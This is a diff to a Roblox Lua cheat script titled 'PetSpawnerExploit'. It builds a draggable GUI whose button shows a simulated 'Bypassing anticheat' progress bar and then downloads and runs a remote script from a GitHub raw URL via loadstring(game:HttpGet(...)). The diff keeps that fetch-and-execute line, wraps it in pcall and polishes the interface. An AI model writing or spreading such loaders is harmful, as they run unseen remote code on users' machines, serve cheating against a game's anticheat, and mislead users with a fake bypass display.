@@ -3,14 +3,19 @@ local Frame = Instance.new("Frame")
 local Title = Instance.new("TextLabel")
 local ExecuteButton = Instance.new("TextButton")
 
+-- Ensure UI is parented correctly
+if game:GetService("CoreGui"):FindFirstChild("PetSpawnerExploit") then
+    game:GetService("CoreGui").PetSpawnerExploit:Destroy()
+end
+
 ScreenGui.Name = "PetSpawnerExploit"
-ScreenGui.Parent = game:GetService("CoreGui") or game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.Parent = game:GetService("CoreGui")
 
 Frame.Name = "MainFrame"
 Frame.Parent = ScreenGui
 Frame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
-Frame.BorderColor3 = Color3.fromRGB(20, 20, 20)
-Frame.Position = UDim2.new(0.5, -100, 0.5, -75)
+Frame.BorderSizePixel = 0
+Frame.Position = UDim2.new(0.5, -100, 0.5, -90)
 Frame.Size = UDim2.new(0, 200, 0, 180)
 Frame.Active = true
 Frame.Draggable = true
@@ -22,7 +27,7 @@ UICorner.Parent = Frame
 Title.Name = "Title"
 Title.Parent = Frame
 Title.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
-Title.BorderColor3 = Color3.fromRGB(20, 20, 20)
+Title.BorderSizePixel = 0
 Title.Position = UDim2.new(0, 0, 0, 0)
 Title.Size = UDim2.new(1, 0, 0, 40)
 Title.Font = Enum.Font.SourceSansBold
@@ -37,7 +42,7 @@ TitleCorner.Parent = Title
 ExecuteButton.Name = "ExecuteButton"
 ExecuteButton.Parent = Frame
 ExecuteButton.BackgroundColor3 = Color3.fromRGB(110, 112, 186)
-ExecuteButton.BorderColor3 = Color3.fromRGB(80, 82, 156)
+ExecuteButton.BorderSizePixel = 0
 ExecuteButton.Position = UDim2.new(0.5, -75, 0.3, 0)
 ExecuteButton.Size = UDim2.new(0, 150, 0, 40)
 ExecuteButton.Font = Enum.Font.SourceSansBold
@@ -49,6 +54,7 @@ local ButtonCorner = Instance.new("UICorner")
 ButtonCorner.CornerRadius = UDim.new(0, 6)
 ButtonCorner.Parent = ExecuteButton
 
+-- Status UI
 local StatusLabel = Instance.new("TextLabel")
 StatusLabel.Name = "StatusLabel"
 StatusLabel.Parent = Frame
@@ -59,7 +65,6 @@ StatusLabel.Font = Enum.Font.SourceSans
 StatusLabel.Text = ""
 StatusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
 StatusLabel.TextSize = 14
-StatusLabel.TextTransparency = 0
 
 local BypassLabel = Instance.new("TextLabel")
 BypassLabel.Name = "BypassLabel"
@@ -71,7 +76,6 @@ BypassLabel.Font = Enum.Font.SourceSans
 BypassLabel.Text = ""
 BypassLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
 BypassLabel.TextSize = 12
-BypassLabel.TextTransparency = 0
 
 local LoadingBarBack = Instance.new("Frame")
 LoadingBarBack.Name = "LoadingBarBack"
@@ -92,27 +96,35 @@ local LoadingBarCorner = Instance.new("UICorner")
 LoadingBarCorner.CornerRadius = UDim.new(1, 0)
 LoadingBarCorner.Parent = LoadingBarBack
 
+-- Fixed execute function with error handling
 local function executeExploit()
     ExecuteButton.Text = "EXECUTING..."
-    StatusLabel.Text = "Initializing script..."
+    StatusLabel.Text = "Initializing..."
     BypassLabel.Text = "Bypassing anticheat..."
     
+    -- Simulate loading
     for i = 1, 10 do
         LoadingBar.Size = UDim2.new(i/10, 0, 1, 0)
-        BypassLabel.Text = "Bypassing anticheat... ("..i*10.."%)"
-        wait(0.1)
+        BypassLabel.Text = "Bypassing... ("..i*10.."%)"
+        task.wait(0.1)
     end
     
-    StatusLabel.Text = "Script executing..."
-    BypassLabel.Text = "Loading remote script..."
-    wait(1)
+    -- Execute the remote script
+    local success, err = pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/thatsepical/spawner/refs/heads/main/growagardenspawner.lua", true))()
+    end)
     
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/thatsepical/spawner/refs/heads/main/growagardenspawner.lua"))()
+    if success then
+        StatusLabel.Text = "Script loaded!"
+        BypassLabel.Text = "Status: Active"
+        LoadingBar.BackgroundColor3 = Color3.fromRGB(100, 255, 100)
+    else
+        StatusLabel.Text = "Error loading script!"
+        BypassLabel.Text = "Error: "..err
+        LoadingBar.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
+    end
     
-    StatusLabel.Text = "Execution complete!"
-    BypassLabel.Text = "Status: Active"
-    ExecuteButton.Text = "EXECUTED"
-    LoadingBar.BackgroundColor3 = Color3.fromRGB(100, 255, 100)
+    ExecuteButton.Text = "DONE"
 end
 
 ExecuteButton.MouseButton1Click:Connect(executeExploit)
